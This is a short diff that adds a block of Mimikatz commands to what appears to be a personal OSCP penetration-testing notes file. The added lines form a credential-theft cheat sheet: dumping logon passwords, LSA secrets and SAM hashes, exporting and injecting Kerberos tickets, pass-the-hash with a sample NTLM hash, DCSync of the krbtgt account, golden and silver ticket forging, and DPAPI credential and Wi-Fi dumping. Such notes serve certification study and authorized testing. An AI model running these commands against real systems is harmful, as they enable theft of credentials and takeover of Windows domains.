@@ -64,6 +64,37 @@ cd <path_to_mimikatz>
 
 mimikatz.exe
 
+privilege::debug       [If successful, you'll see Privilege '20' OK]
+
+sekurlsa::logonpasswords
+
+lsadump::secrets
+
+lsadump::sam
+
+sekurlsa::tickets
+
+sekurlsa::tickets /export
+
+kerberos::ptt <ticket_file.kirbi>
+
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:<command>
+
+**ex. sekurlsa::pth /user:admin /domain:example.com /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:cmd**
+
+lsadump::dcsync /user:<domain>\krbtgt
+
+kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:<rid>
+
+kerberos::ptt <ticket_file.kirbi>
+
+kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /target:<target_machine> /rc4:<ntlm_hash> /service:<service_name>
+
+dpapi::cred
+dpapi::wifi
+
+(credentials dumping )
+
 ///////////////////////////
 
 # OSCP-Survival-Guide
